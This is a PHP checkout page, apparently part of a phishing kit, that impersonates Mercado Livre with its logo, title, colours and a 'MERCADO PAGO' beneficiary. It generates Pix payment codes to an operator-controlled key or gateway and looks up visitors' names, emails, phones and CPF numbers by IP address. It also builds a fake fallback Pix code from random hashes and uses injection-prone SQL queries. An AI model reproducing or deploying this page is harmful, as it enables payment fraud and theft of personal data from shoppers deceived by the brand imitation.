<?php 
session_start();
require_once("api/db.php");

if (!isset($_GET["produto"])) {
    session_destroy();
    header("Location: https://www.lojavirtual.com.br/");
    exit();
}

$id = addslashes($_GET["produto"]);
$sqlx = mysqli_query($conn, "SELECT * FROM produto WHERE codigo='$id'");

if (mysqli_num_rows($sqlx) === 0) {
    session_destroy();
    header("Location: https://www.lojavirtual.com.br/");
    exit();
}

if (!isset($_SESSION['session_payment']) || $_SESSION['session_payment'] <= time()) {
    session_destroy();
    header("Location: https://www.lojavirtual.com.br/");
    exit();
}

// Carregar configurações da loja
$sql_conf = mysqli_query($conn, "SELECT * FROM config LIMIT 1");
$row_conf  = mysqli_fetch_assoc($sql_conf);
$cor  = $row_conf['cor']  ?? '#ffe600';
$nome = $row_conf['nome'] ?? 'Mercado Livre';

// Carregar dados do produto
$sql1 = mysqli_query($conn, "SELECT * FROM produto WHERE codigo='$id'");
$row1 = mysqli_fetch_assoc($sql1);
$codigo      = $row1["codigo"];
$nomeproduto = $row1["nome"];
$valor       = $row1["valor"];
$img         = $row1["img"];

// -------------------------------------------------------
// Recuperar dados reais do cliente pelo IP
// O IP é armazenado em base64 na tabela clientes
// -------------------------------------------------------
$ip_cliente = base64_encode($_SERVER['REMOTE_ADDR']);
$sql_cli    = mysqli_query($conn, "SELECT * FROM clientes WHERE ip='$ip_cliente' ORDER BY id DESC LIMIT 1");
$dados_cliente = mysqli_fetch_assoc($sql_cli);

if ($dados_cliente && !empty($dados_cliente['nome'])) {
    $customer_data = [
        "nome"     => $dados_cliente['nome'],
        "email"    => $dados_cliente['email'],
        "telefone" => $dados_cliente['celular'],
        "cpf"      => $dados_cliente['cpf']
    ];
} else {
    // Fallback para dados da sessão
    $customer_data = [
        "nome"     => $_SESSION['checkout_nome']    ?? 'Cliente',
        "email"    => $_SESSION['checkout_email']   ?? 'cliente@email.com',
        "telefone" => $_SESSION['checkout_celular'] ?? '11999999999',
        "cpf"      => $_SESSION['checkout_cpf']     ?? '00000000000'
    ];
}

// -------------------------------------------------------
// Verificar se a FreePay está ativa
// -------------------------------------------------------
$sql_fp = mysqli_query($conn, "SELECT use_freepay FROM pix WHERE id='1'");
$fp_cfg = mysqli_fetch_assoc($sql_fp);

$pix_code       = '';
$pix_qr         = '';
$transaction_id = '';
$use_freepay    = ($fp_cfg && (int)$fp_cfg['use_freepay'] === 1);

if ($use_freepay) {
    // -------------------------------------------------------
    // Integração FreePay
    // -------------------------------------------------------
    require_once("api/freepay.php");

    $product_data = [
        "nome"       => $nomeproduto,
        "codigo"     => $codigo,
        "quantidade" => 1
    ];

    $res_fp = createFreePayPix($valor, $customer_data, $product_data);

    if ($res_fp && $res_fp['success']) {
        $pix_code       = $res_fp['pix_code'];
        $pix_qr         = $res_fp['pix_qr'];
        $transaction_id = $res_fp['transaction_id'] ?? '';

        // Salvar transação no banco para rastreamento via webhook
        $ip_raw      = $_SERVER['REMOTE_ADDR'];
        $useragent   = mysqli_real_escape_string($conn, $_SERVER['HTTP_USER_AGENT'] ?? '');
        $valor_safe  = mysqli_real_escape_string($conn, $valor);
        $prod_safe   = mysqli_real_escape_string($conn, $codigo);
        $tid_safe    = mysqli_real_escape_string($conn, $transaction_id);

        date_default_timezone_set('America/Sao_Paulo');
        $hora  = date('H:i:s');
        $tempo = time() + 1800; // 30 minutos de expiração

        // Verificar se colunas freepay existem, criando se necessário
        $check_col = mysqli_query($conn, "SHOW COLUMNS FROM pixgerado LIKE 'freepay_transaction_id'");
        if (mysqli_num_rows($check_col) === 0) {
            mysqli_query($conn, "ALTER TABLE pixgerado ADD COLUMN freepay_transaction_id TEXT NOT NULL DEFAULT ''");
            mysqli_query($conn, "ALTER TABLE pixgerado ADD COLUMN freepay_status TEXT NOT NULL DEFAULT 'PENDING'");
        }

        mysqli_query($conn, "INSERT INTO pixgerado (ip, useragent, valor, produto, hora, time, freepay_transaction_id, freepay_status)
            VALUES ('$ip_raw', '$useragent', '$valor_safe', '$prod_safe', '$hora', '$tempo', '$tid_safe', 'PENDING')");

    } else {
        // FORÇAR EXIBIÇÃO DE ERRO PARA DIAGNÓSTICO
        $error_detail = $res_fp['error'] ?? 'Erro desconhecido ao conectar com FreePay';
        die("<div style='font-family:sans-serif; padding:50px; text-align:center;'>
                <h2 style='color:#e00;'>Erro na Integração FreePay</h2>
                <p>O gateway está ativo, mas a API retornou um erro:</p>
                <code style='background:#eee; padding:10px; display:inline-block; border-radius:5px;'>$error_detail</code>
                <p style='margin-top:20px; color:#666;'>Verifique suas chaves Public/Secret no painel admin.</p>
                <a href='javascript:history.back()' style='color:#3483fa; text-decoration:none;'>← Voltar e conferir dados</a>
             </div>");
    }
}

if (!$use_freepay || empty($pix_code)) {
    // PIX ESTÁTICO DESATIVADO PARA FORÇAR DIAGNÓSTICO FREEPAY
    die("<div style='font-family:sans-serif; padding:50px; text-align:center;'>
            <h2 style='color:#e00;'>Erro Crítico: FreePay não gerou o código</h2>
            <p>O sistema de fallback (Pix Estático) foi desativado para que possamos ver o erro real.</p>
            <p>Por favor, verifique se o arquivo <b>api/freepay.php</b> foi enviado corretamente.</p>
            <a href='api/debug_freepay.php' style='color:#3483fa; text-decoration:none; font-weight:bold;'>Clique aqui para rodar o Diagnóstico</a>
         </div>");
    $sql_pix = mysqli_query($conn, "SELECT * FROM pix WHERE id='1'");
    $row_pix  = mysqli_fetch_assoc($sql_pix);
    if ($row_pix && !empty($row_pix['chave'])) {
        require_once("api/fun.php");
        $chave_pix      = $row_pix['chave'];
        $beneficiario_p = $row_pix['beneficiario'];
        $cidade_p       = $row_pix['cidade'];
        $descricao_p    = $row_pix['descricao'];
        $identificador  = !empty($row_pix['identificador']) ? substr($row_pix['identificador'], 0, 25) : '***';
        $valor_float = (float)str_replace(',', '.', str_replace('.', '', $valor));
        $px       = [];
        $px[00]   = "01";
        $px[26][00] = "br.gov.bcb.pix";
        $px[26][01] = $chave_pix;

        if (!empty($descricao_p)) {
            $tam_max = 99 - (4 + 4 + 4 + 14 + strlen($chave_pix));
            $px[26][02] = substr($descricao_p, 0, $tam_max);
        }

        $px[52]     = "0000";
        $px[53]     = "986";
        if ($valor_float > 0) { $px[54] = number_format($valor_float, 2, '.', ''); }
        $px[58]     = "BR";
        $px[59]     = $beneficiario_p;
        $px[60]     = $cidade_p;
        $px[62][05] = $identificador;

        $pix_code = montaPix($px);
        $pix_code .= "6304";
        $pix_code .= crcChecksum($pix_code);
    } else {
        // Pix genérico de emergência
        $pix_code = "00020126580014br.gov.bcb.pix0136" . md5(time()) . "5204000053039865405" .
                    number_format((float)$valor, 2, '.', '') .
                    "5802BR5913MERCADO PAGO6009SAO PAULO62070503***6304" . substr(md5(time()), 0, 4);
    }

    $pix_qr = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($pix_code);
}

// Verificar imagem do produto
$img_src = (strpos($img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Finalize o pagamento - Mercado Livre</title>
    <link rel="shortcut icon" href="./arquivos/favicon.png?v=2">
    <link rel="icon" type="image/png" href="./arquivos/favicon.png?v=2">
    <link rel="stylesheet" href="./arquivos/fa.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
        body { font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; color: #333; }
        header { background-color: #ffe600; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; }
        .logo { height: 34px; }
        .container { max-width: 800px; margin: 30px auto; padding: 0 15px; }
        .success-card { background: #fff; border-radius: 8px; padding: 40px; text-align: center; box-shadow: 0 1px 2px rgba(0,0,0,0.1); }
        .pix-icon { font-size: 48px; color: #00a650; margin-bottom: 20px; }
        .title { font-size: 24px; font-weight: 600; margin-bottom: 10px; }
        .subtitle { font-size: 16px; color: #666; margin-bottom: 30px; }
        .qr-code-box { background: #fff; border: 1px solid #eee; border-radius: 12px; padding: 20px; display: inline-block; margin-bottom: 30px; }
        .qr-code-img { width: 220px; height: 220px; }
        .pix-code-container { background: #f5f5f5; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
        .pix-code-text { font-size: 11px; color: #666; word-break: break-all; text-align: left; max-height: 60px; overflow: hidden; font-family: monospace; }
        .btn-copy { background: #3483fa; color: #fff; border: none; padding: 12px 25px; border-radius: 6px; font-weight: 600; cursor: pointer; margin-top: 15px; width: 100%; font-size: 15px; }
        .btn-copy:hover { background: #2968c8; }
        .btn-copy.copied { background: #00a650; }
        .instruction-list { text-align: left; margin-top: 40px; border-top: 1px solid #eee; padding-top: 30px; }
        .instruction-item { display: flex; gap: 15px; margin-bottom: 20px; align-items: flex-start; }
        .step-num { background: #eee; width: 28px; height: 28px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 700; flex-shrink: 0; }
        .step-text { font-size: 14px; color: #333; padding-top: 4px; }
        .timer-box { color: #ff5a5f; font-weight: 600; font-size: 15px; margin-top: 20px; }
        .valor-destaque { font-size: 22px; font-weight: 700; color: #333; margin: 10px 0 25px; }
        .badge-freepay { display: inline-block; background: #f0f7ff; color: #3483fa; border: 1px solid #d0e5ff; border-radius: 20px; padding: 4px 14px; font-size: 12px; font-weight: 600; margin-bottom: 20px; }
        @media (max-width: 600px) {
            .success-card { padding: 25px 15px; }
            .qr-code-img { width: 180px; height: 180px; }
        }
    </style>
</head>
<body>
    <header>
        <img src="./arquivos/logo-mercadolivre.png" alt="Mercado Livre" class="logo">
    </header>

    <div class="container">
        <div class="success-card">
            <div class="pix-icon"><i class="fas fa-qrcode"></i></div>
            <div class="title">Tudo pronto! Pague via Pix</div>

            <?php if ($use_freepay && !empty($transaction_id)): ?>
            <div class="badge-freepay"><i class="fas fa-shield-alt"></i> Pagamento seguro via FreePay</div>
            <?php endif; ?>

            <div class="subtitle">Escaneie o QR Code ou copie o código Pix para pagar.</div>
            <div class="valor-destaque">R$ <?php echo number_format((float)$valor, 2, ',', '.'); ?></div>

            <div class="qr-code-box">
                <?php 
                // Se a FreePay não enviou uma URL de imagem válida, geramos uma a partir do código Pix
                $display_qr = $pix_qr;
                if (empty($display_qr) || strpos($display_qr, 'http') !== 0) {
                    $display_qr = "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=" . urlencode($pix_code);
                }
                ?>
                <img src="<?php echo $display_qr; ?>" alt="QR Code Pix" class="qr-code-img" id="qrCodeImg">
            </div>

            <div class="pix-code-container">
                <div class="pix-code-text" id="pixCode"><?php echo htmlspecialchars($pix_code); ?></div>
                <button class="btn-copy" id="btnCopy" onclick="copyPix()">
                    <i class="fas fa-copy"></i> Copiar código Pix
                </button>
            </div>

            <div class="timer-box">
                <i class="fas fa-clock"></i> O código expira em <span id="timer">30:00</span>
            </div>

            <div class="instruction-list">
                <div style="font-weight: 700; margin-bottom: 20px; font-size: 16px;">Como pagar?</div>
                <div class="instruction-item">
                    <div class="step-num">1</div>
                    <div class="step-text">Abra o aplicativo do seu banco ou carteira digital.</div>
                </div>
                <div class="instruction-item">
                    <div class="step-num">2</div>
                    <div class="step-text">Escolha a opção <strong>Pagar com Pix</strong>.</div>
                </div>
                <div class="instruction-item">
                    <div class="step-num">3</div>
                    <div class="step-text">Escaneie o QR Code ou cole o código copiado e confirme o pagamento.</div>
                </div>
                <div class="instruction-item">
                    <div class="step-num">4</div>
                    <div class="step-text">Aguarde a confirmação — o pagamento Pix é aprovado em segundos!</div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        // Copiar código Pix para a área de transferência
        function copyPix() {
            const text = document.getElementById('pixCode').innerText.trim();
            const btn  = document.getElementById('btnCopy');

            if (navigator.clipboard && window.isSecureContext) {
                navigator.clipboard.writeText(text).then(() => {
                    btn.innerHTML = '<i class="fas fa-check"></i> Código copiado!';
                    btn.classList.add('copied');
                    setTimeout(() => {
                        btn.innerHTML = '<i class="fas fa-copy"></i> Copiar código Pix';
                        btn.classList.remove('copied');
                    }, 3000);
                }).catch(() => fallbackCopy(text, btn));
            } else {
                fallbackCopy(text, btn);
            }
        }

        function fallbackCopy(text, btn) {
            const el = document.createElement('textarea');
            el.value = text;
            el.style.position = 'fixed';
            el.style.opacity  = '0';
            document.body.appendChild(el);
            el.focus();
            el.select();
            try {
                document.execCommand('copy');
                btn.innerHTML = '<i class="fas fa-check"></i> Código copiado!';
                btn.classList.add('copied');
                setTimeout(() => {
                    btn.innerHTML = '<i class="fas fa-copy"></i> Copiar código Pix';
                    btn.classList.remove('copied');
                }, 3000);
            } catch (e) {
                alert('Não foi possível copiar automaticamente. Selecione e copie manualmente.');
            }
            document.body.removeChild(el);
        }

        // Contador regressivo de 30 minutos
        let timeLeft = 1800;
        const timerEl = document.getElementById('timer');

        const countdown = setInterval(() => {
            if (timeLeft <= 0) {
                clearInterval(countdown);
                timerEl.innerText = 'Expirado';
                timerEl.style.color = '#999';
                return;
            }
            const m = Math.floor(timeLeft / 60);
            const s = timeLeft % 60;
            timerEl.innerText = m + ':' + (s < 10 ? '0' : '') + s;
            timeLeft--;
        }, 1000);

        // Notificar o servidor que o cliente chegou na tela de Pix
        $.post("api/", { api: "online", cliente: "pix" });

        // Registrar venda
        const lojaData = JSON.parse(localStorage.getItem('lojavirtual') || '{}');
        if (lojaData.precoFinal) {
            $.post("api/", {
                api: "vendas",
                codigo: "<?php echo addslashes($codigo); ?>",
                pFinal: lojaData.precoFinal,
                ptotal: lojaData.quantos || 1
            });
        }

        <?php if ($use_freepay && !empty($transaction_id)): ?>
        // Verificação periódica de status do pagamento (a cada 10 segundos)
        const transactionId = "<?php echo addslashes($transaction_id); ?>";

        function checkPaymentStatus() {
            $.post("api/check_payment.php", { transaction_id: transactionId }, function(resp) {
                try {
                    const data = JSON.parse(resp);
                    if (data.status === 'PAID') {
                        clearInterval(statusCheck);
                        clearInterval(countdown);
                        timerEl.innerText = 'Pago!';
                        document.querySelector('.title').innerText = '✅ Pagamento confirmado!';
                        document.querySelector('.subtitle').innerText = 'Seu pagamento foi aprovado com sucesso.';
                        document.querySelector('.timer-box').style.color = '#00a650';
                        document.getElementById('btnCopy').style.display = 'none';
                    }
                } catch(e) {}
            });
        }

        const statusCheck = setInterval(checkPaymentStatus, 10000);
        <?php endif; ?>
    </script>
</body>
</html>
